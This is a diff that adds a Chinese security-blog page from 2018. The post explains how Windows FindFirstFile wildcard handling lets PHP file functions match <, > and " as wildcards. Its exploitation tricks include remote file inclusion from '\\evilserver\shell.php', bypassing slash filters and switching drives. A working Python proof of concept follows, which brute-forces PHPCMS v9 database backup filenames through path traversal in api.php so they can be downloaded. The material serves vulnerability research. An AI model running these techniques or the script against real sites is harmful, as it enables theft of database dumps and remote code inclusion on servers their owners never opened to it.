@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Windows一个API引起PHP函数的bug，可导致猜测一些文件。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP和Windows文件通配符">
+<meta property="og:url" content="http://yoursite.com/2018/03/14/php和WINDOWS文件通配符/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="Windows一个API引起PHP函数的bug，可导致猜测一些文件。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-14/57805822.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-14/73761705.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-13/13219180.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-15/44515029.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-15/47775715.jpg">
+<meta property="og:updated_time" content="2018-03-15T05:19:12.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP和Windows文件通配符">
+<meta name="twitter:description" content="Windows一个API引起PHP函数的bug，可导致猜测一些文件。">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-14/57805822.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/14/php和WINDOWS文件通配符/"/>
+
+
+
+
+
+  <title>PHP和Windows文件通配符 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/14/php和WINDOWS文件通配符/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHP和Windows文件通配符</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-14T18:13:23+08:00">
+                2018-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全研究/" itemprop="url" rel="index">
+                    <span itemprop="name">安全研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><code>Windows</code>一个<code>API</code>引起<code>PHP</code>函数的<code>bug</code>，可导致猜测一些文件。</p>
+<a id="more"></a>
+<h4 id="PHP源码调试之WINDOWS文件通配符分析"><a href="#PHP源码调试之WINDOWS文件通配符分析" class="headerlink" title="PHP源码调试之WINDOWS文件通配符分析"></a><a href="http://avfisher.win/archives/888" target="_blank" rel="noopener">PHP源码调试之WINDOWS文件通配符分析</a></h4><p><a href="https://blog.hacking8.com/?post=230" target="_blank" rel="noopener">windows下的&lt;&lt;通配符在php下的利用</a></p>
+<blockquote>
+<p>windows的FindFirstFile（API)有个特性就是可以把&lt;&lt;当成通配符来用。而PHP的opendir(win32\readdir.c)就使用了该API。PHP的文件操作函数均调用了opendir,所以file_exists也有此特性。</p>
+</blockquote>
+<p><a href="http://www.jinglingshu.org/?p=8790" target="_blank" rel="noopener">渗透中利用到的一些windows特性</a></p>
+<p><strong>测试代码-1</strong></p>
+<pre><code>&lt;?php
+for($i=0;$i&lt;255;$i++){
+    $url = &apos;1.ph&apos; . chr($i);
+    $tmp = @file_get_contents($url);
+    if(!empty($tmp))
+        echo &apos;1.ph&apos; . chr($i).&quot;\n&quot;;
+
+}
+?&gt;
+</code></pre><p><code>1.php</code>已知存在，访问上面的脚本，得到的结果为：</p>
+<pre><code>1.ph&lt;
+1.ph&gt;
+1.phP
+1.php
+</code></pre><p>不为空，尝试输出其中的内容。</p>
+<pre><code>&lt;?php
+for($i=0;$i&lt;255;$i++){
+    $url = &apos;1.ph&apos; . chr($i);
+    $tmp = @file_get_contents($url);
+    print $tmp;
+    if(!empty($tmp))
+        echo &apos;  1.ph&apos; . chr($i).&quot;\n&quot;;
+
+}
+?&gt;
+</code></pre><p>访问该脚本为：可以读取其中的内容。</p>
+<pre><code>aaaaaaaaaa  1.ph&lt;
+aaaaaaaaaa  1.ph&gt;
+aaaaaaaaaa  1.phP
+aaaaaaaaaa  1.php
+</code></pre><p>单独访问该文件的时候，是访问不到的。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-14/57805822.jpg" alt=""></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-14/73761705.jpg" alt=""></p>
+<p>都能得到返回。后两个结果是可以理解的(因为<code>windows</code>的文件系统支持大小写转换的机制)，但是前两种应该是个<code>bug</code>，影响windows+php版本。</p>
+<p><strong>测试代码-2</strong></p>
+<p>对上面的代码修改一下。</p>
+<pre><code>&lt;?php
+for($j=0;$j&lt;256;$j++){
+for($i=0;$i&lt;256;$i++){
+    $url = &apos;1.p&apos; . chr($j) . chr($i);
+    $tmp = @file_get_contents($url);
+    if(!empty($tmp))
+        echo &apos;1.p&apos; . chr($j) . chr($i).&quot;\n&quot;;
+}        
+}
+?&gt;
+</code></pre><p>结果如下：</p>
+<pre><code>1.p&lt; 
+1.p&lt;&quot;
+1.p&lt;.
+1.p&lt;&lt;
+1.p&lt;&gt;
+1.p&lt;P
+1.p&gt;&lt;
+1.p&gt;&gt;
+1.p&gt;P
+1.p&gt;p
+1.pH&lt;
+1.pH&gt;
+1.pHP
+1.pHp
+1.ph&lt;
+1.ph&gt;
+1.phP
+</code></pre><p>为什么会出现这个<code>1.ph&lt;</code>、<code>1.ph&gt;</code>、<code>1.p&lt;&gt;</code>、<code>1.p&lt;&quot;</code>，这些和<code>1.php</code>是不相等的。</p>
+<p>出现这个<code>bug</code>的原因是<code>php</code>解析器的过程中，由一个<code>Winapi</code>函数<code>FindFirstFile()</code>所导致的。<br>该Windows API方法对于这三个字符做了特别的对待和处理、字符”&gt;”被替换为”?”，字符”&lt;”被替换成”*”，而符号”(双引号)被替换为一个”.”字符。</p>
+<p><strong>利用</strong></p>
+<p>1.当调用FindFirstFile()函数时，”&lt;”被替换成<code>*</code>,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，为了确保能够使”&lt;”被替换成<code>*</code>,应当采用”&lt;&lt;”。</p>
+<pre><code>EXAMPLE:include(‘shell&lt;’);  或者include(‘shell&lt;&lt;’);    //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。
+</code></pre><p>2.当调用FindFirstFile()函数时，”&gt;”被替换成”?”,这意味这”&gt;”可以替换单个任意字符</p>
+<pre><code>EXAMPLE：include(‘shell.p&gt;p’);    //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。
+</code></pre><p>3.当调用FindFirstFile()函数时，”””(双引号)被替换成”.”</p>
+<pre><code>EXAMPLE:include(‘shell”php’);    //===&gt;include(‘shell.php’);
+</code></pre><p>4.如果文件名第一个字符是”.”的话，读取时可以忽略之</p>
+<pre><code>EXAMPLE：fopen(‘.htacess’);  //==&gt;fopen(‘htacess’);   //加上第一点中的利用 ==&gt;fopen(‘h&lt;&lt;’);
+</code></pre><p>5.文件名末尾可以加上一系列的/或者\的合集，你也可以在/或者\中间加上.字符，只要确保最后一位为”.”</p>
+<pre><code>EXAMPLE：fopen(“config.ini\\.// \/\/\/.”);==&gt;  fopen(‘config.ini\./.\.’); ==&gt;fopen(‘config.ini/////.’)==&gt;fopen(‘config.ini…..’)
+</code></pre><p>6.该函数也可以调用以”\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过<code>allow_url_fopen=Off</code>并最终导致一个RFI（远程文件包含）</p>
+<pre><code>EXAMPLE：include (‘\\evilserver\shell.php’);
+</code></pre><p>7.用以下方法还可以切换文件的盘名</p>
+<pre><code>include(‘\\.\C:\my\file.php\..\..\..\D:\anotherfile.php’);
+</code></pre><p>8.选择磁盘命名语法可以用来绕过斜线字符过滤</p>
+<pre><code>file_get_contents(‘C:boot.ini’); //==&gt;  file_get_contents (‘C:/boot.ini’);
+</code></pre><h4 id="PHPCMSv9逻辑漏洞导致备份文件名可猜测"><a href="#PHPCMSv9逻辑漏洞导致备份文件名可猜测" class="headerlink" title="PHPCMSv9逻辑漏洞导致备份文件名可猜测"></a><a href="https://mp.weixin.qq.com/s?__biz=MzIxNjkwODg4OQ==&amp;mid=2247483837&amp;idx=1&amp;sn=6f448a26d079bfa379c627e32f4fc321&amp;chksm=9780948ba0f71d9d78f86edf78e9fef4b8a11f613382d819ff3b913b96fb94527165c1858045&amp;mpshare=1&amp;scene=23&amp;srcid=0228HeL0BaWSz3dPxqc6pIDJ#rd" target="_blank" rel="noopener">PHPCMSv9逻辑漏洞导致备份文件名可猜测</a></h4><p><code>api\creatimg.php</code>文件里面，<code>$fontfile</code>变量可控，且没有对一些特殊字符过滤，比如<code>\.</code>等，便进入<code>file_exists</code>函数判断。当文件存在和不存在时所返回的页面是不一样的。利用这个点把随机字母名称的备份文件推算出来。</p>
+<p>然后利用<code>windows</code>通配符在<code>php</code>中的<code>bug</code>，测试文件是否存在。</p>
+<pre><code>&lt;?php
+defined(&apos;IN_PHPCMS&apos;) or exit(&apos;No permission resources.&apos;); 
+$txt = trim($_GET[&apos;txt&apos;]);
+/*extension_loaded — 检查一个扩展是否已经加载*/
+if(extension_loaded(&apos;gd&apos;) &amp;&amp; $txt ) {  
+    header (&quot;Content-type: image/png&quot;);
+    $txt = urldecode(sys_auth($txt, &apos;DECODE&apos;));
+    $fontsize = isset($_GET[&apos;fontsize&apos;]) ? intval($_GET[&apos;fontsize&apos;]) : 16;
+    $fontpath = PC_PATH.&apos;libs&apos;.DIRECTORY_SEPARATOR.&apos;data&apos;.DIRECTORY_SEPARATOR.&apos;font&apos;.DIRECTORY_SEPARATOR;
+    $fontfile = isset($_GET[&apos;font&apos;]) &amp;&amp; !empty($_GET[&apos;font&apos;]) ? $fontpath.trim($_GET[&apos;font&apos;]) : $fontpath.&apos;georgia.ttf&apos;;    
+    $fontcolor = isset($_GET[&apos;fontcolor&apos;]) &amp;&amp; !empty($_GET[&apos;fontcolor&apos;]) ? trim($_GET[&apos;fontcolor&apos;]) : &apos;FF0000&apos;;
+    $fontcolor_r = hexdec(substr($fontcolor,0,2));
+    $fontcolor_g = hexdec(substr($fontcolor,2,2));
+    $fontcolor_b = hexdec(substr($fontcolor,4,2));
+    if(file_exists($fontfile)){
+
+        //计算文本写入后的宽度，右下角 X 位置-左下角 X 位置
+        $image_info = imagettfbbox($fontsize,0,$fontfile,$txt);
+        $imageX = $image_info[2]-$image_info[0]+10;
+        $imageY = $image_info[1]-$image_info[7]+5;
+        //print_r($image_info);
+        $im = @imagecreatetruecolor ($imageX, $imageY) or die (&quot;Cannot Initialize new GD image stream&quot;);
+        $white= imagecolorallocate($im, 255, 255, 255);
+        $font_color= imagecolorallocate($im,$fontcolor_r,$fontcolor_g,$fontcolor_b);
+        if(intval($_GET[&apos;transparent&apos;]) == 1) imagecolortransparent($im,$white); //背景透明
+        imagefilledrectangle($im, 0, 0, $imageX, $imageY, $white);
+        $txt = iconv(CHARSET,&quot;UTF-8&quot;,$txt);
+        imagettftext($im, $fontsize, 0, 5, $imageY-5, $font_color, $fontfile, $txt);
+
+    } else {
+
+        $imageX = strlen($txt)*9;
+        $im = @imagecreate ($imageX, 16) or die (&quot;Cannot Initialize new GD image stream&quot;);
+        $bgColor = ImageColorAllocate($im,255,255,255);
+        $white=imagecolorallocate($im,234,185,95);
+        $font_color=imagecolorallocate($im,$fontcolor_r,$fontcolor_g,$fontcolor_b);        
+        $fonttype = intval($_GET[&apos;fonttype&apos;]);
+        imagestring ($im, $fonttype, 0, 0,$txt, $font_color);
+    }
+    imagepng ($im);
+    imagedestroy ($im);    
+}
+?&gt;
+</code></pre><p>安装完之后，没有在<code>\caches\bakup\default\</code>目录下面发现备份的<code>sql</code>文件，那是因为没有进行备份操作。</p>
+<p>在后台的，扩展-&gt;数据库工具里面有备份操作，备份后就可以在相应目录下面生成备份文件了。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-13/13219180.jpg" alt=""></p>
+<p>分析其中的<code>sql</code>备份文件的格式为<code>4eu9poz8ehqe1gq1o69o_db_20180313_1.sql</code>，前二十位为数字和字母的结合，然后<code>_db_</code>固定，8位数字日期，以<code>_1.sql</code>结尾。</p>
+<pre><code># -*- coding:utf-8 -*-
+# author DYSRC
+
+import urllib2
+
+
+def check(url):
+    mark = True
+    req = urllib2.Request(url)
+    req.add_header(&apos;User-agent&apos;, &apos;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&apos;)
+    response = urllib2.urlopen(req)
+    content = response.read()
+    if &apos;Cannot&apos; in content:
+        mark = False
+    return mark
+
+
+def guest(target):
+    arr = []
+    num = map(chr, range(48, 58))  # num [0-9]
+    alpha = map(chr, range(97, 123))  # alpha [a-z]
+    exploit = &apos;%s/api.php?op=creatimg&amp;txt=dysec&amp;font=/../../../../caches/bakup/default/%s%s&lt;&lt;.sql&apos;
+
+    while True:
+        for char in num:
+            if check(exploit % (target, &apos;&apos;.join(arr), char)):
+                a = exploit % (target, &apos;&apos;.join(arr), char)
+                print a
+                arr.append(char)  #首先arr是空
+                print &quot;&quot;.join(arr)
+                continue
+
+        if len(arr) &lt; 20:
+            for char in alpha:
+                if check(exploit % (target, &apos;&apos;.join(arr), char)):
+                    a = exploit % (target, &apos;&apos;.join(arr), char)
+                    print a
+                    arr.append(char)
+                    print &quot;&quot;.join(arr)
+
+                    continue
+
+        elif len(arr) == 20:  # 达到20个字母和数字的时候，添加固定的_db_
+            arr.append(&apos;_db_&apos;)
+
+        elif len(arr) == 29:
+            print arr
+            print len(arr)
+            arr.append(&apos;_1.sql&apos;)
+
+            break
+        if len(arr) &lt; 1:
+            print &apos;[*] not find!&apos;
+            return
+
+    print  &apos;[*]find: %s/caches/bakup/default/%s&apos; % (target, &apos;&apos;.join(arr))
+
+
+if __name__ == &quot;__main__&quot;:
+    url = &quot;http://127.0.0.1:8000/phpcms6&quot;
+    guest(url)
+</code></pre><p>将其中的执行流程分析一下。通过访问<code>url</code>的返回结果来判断是否存在该文件。如果返回结果里面包含<code>Cannot Initialize new GD image stream</code>，则不存在这个备份文件。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-15/44515029.jpg" alt=""></p>
+<p><code>POC</code>执行过程。</p>
+<p>第一位先猜测数字从<code>1-9</code>，如果不是，则字母从<code>a-z</code>开始，一次次的循环数字和字母进行猜测。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-15/47775715.jpg" alt=""></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="http://www.webmaster5u.com/html/article_3094.html" target="_blank" rel="noopener">phpcms v9数据库备份文件存在哪里(数据备份，恢复、优化、修复等常用操作)</a></p>
+<p><a href="https://mochazz.github.io/2018/03/09/phpcms_v9_sql%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8D%E7%88%86%E7%A0%B4/" target="_blank" rel="noopener">phpcms v9 sql备份文件名爆破</a></p>
+<p><a href="http://avfisher.win/archives/888" target="_blank" rel="noopener">PHP源码调试之WINDOWS文件通配符分析</a></p>
+<p><a href="http://www.jinglingshu.org/?p=8790" target="_blank" rel="noopener">渗透中利用到的一些windows特性</a></p>
+<p><a href="https://sourceforge.net/projects/waspap/files/waspap/Core/php-file-onsec.whitepaper-02.eng.pdf/download?use_mirror=ayera&amp;r=https%3A%2F%2Fosdn.net%2Fprojects%2Fsfnet_waspap%2Fdownloads%2Fwaspap%2FCore%2Fphp-file-onsec.whitepaper-02.eng.pdf%2F&amp;use_mirror=ayera" target="_blank" rel="noopener">php-file-onsec.whitepaper-02.eng</a></p>
+<p><a href="https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">DEDECMS找后台目录</a></p>
+<p><a href="https://xianzhi.aliyun.com/forum/topic/2064?accounttraceid=9af9a42c-2c59-42df-801d-ded4251587e0" target="_blank" rel="noopener">解决DEDECMS历史难题–找后台目录</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/11/Study_from_other/" rel="next" title="Web安全知识点">
+                <i class="fa fa-chevron-left"></i> Web安全知识点
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/15/队列/" rel="prev" title="队列">
+                队列 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP源码调试之WINDOWS文件通配符分析"><span class="nav-number">1.</span> <span class="nav-text">PHP源码调试之WINDOWS文件通配符分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHPCMSv9逻辑漏洞导致备份文件名可猜测"><span class="nav-number">2.</span> <span class="nav-text">PHPCMSv9逻辑漏洞导致备份文件名可猜测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
